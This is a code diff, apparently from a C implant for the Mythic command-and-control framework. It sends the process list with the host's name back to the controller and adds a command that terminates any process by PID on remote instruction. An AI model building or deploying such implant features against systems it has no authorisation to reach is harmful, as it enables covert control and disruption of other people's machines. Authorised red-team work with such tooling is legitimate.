@@ -92,8 +92,26 @@ VOID ProcessList(PCHAR taskUuid, PPARSER arguments)
         goto cleanup;
 	}
 
-    // Success
-    PackageComplete(taskUuid, locals);
+    /* Mythic Process Browser: dedicated message type with host + TSV body */
+    {
+        CHAR hostname[MAX_COMPUTERNAME_LENGTH + 1] = { 0 };
+        DWORD hostnameLen = (DWORD)sizeof(hostname);
+        if (!GetComputerNameA(hostname, &hostnameLen)) {
+            hostname[0] = '\0';
+        }
+
+        PPackage data = PackageInit(0, FALSE);
+        PackageAddByte(data, PROCESS_BROWSER);
+        PackageAddString(data, taskUuid, FALSE);
+        PackageAddByte(data, TASK_COMPLETE);
+        PackageAddString(data, hostname, TRUE); /* length-prefixed host for Mythic process matching */
+        if (locals != NULL && locals->buffer != NULL && locals->length > 0) {
+            PackageAddBytes(data, (PBYTE)locals->buffer, locals->length, TRUE);
+        } else {
+            PackageAddInt32(data, 0);
+        }
+        PackageQueue(data);
+    }
 
 cleanup:
 	if (toolhelp)
@@ -102,3 +120,41 @@ cleanup:
     PackageDestroy(locals);
 }
 #endif	//INCLUDE_CMD_PS
+
+#ifdef INCLUDE_CMD_KILL
+VOID ProcessKill(PCHAR taskUuid, PPARSER arguments)
+{
+    UINT32 nbArg = ParserGetInt32(arguments);
+    _dbg("\t Got %d arguments", nbArg);
+
+    if (nbArg == 0)
+	{
+        PackageError(taskUuid, ERROR_INVALID_PARAMETER);
+        return;
+    }
+
+    UINT32 pid = ParserGetInt32(arguments);
+    _dbg("Trying to kill pid : %d", pid);
+
+    HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
+    if (!hProcess)
+	{
+        DWORD error = GetLastError();
+        _err("Could not open process %d ERROR : %d", pid, error);
+        PackageError(taskUuid, error);
+        return;
+    }
+
+    if (!TerminateProcess(hProcess, 1))
+	{
+        DWORD error = GetLastError();
+        _err("Could not terminate process %d ERROR : %d", pid, error);
+        CloseHandle(hProcess);
+        PackageError(taskUuid, error);
+        return;
+    }
+
+    CloseHandle(hProcess);
+    PackageComplete(taskUuid, NULL);
+}
+#endif	//INCLUDE_CMD_KILL
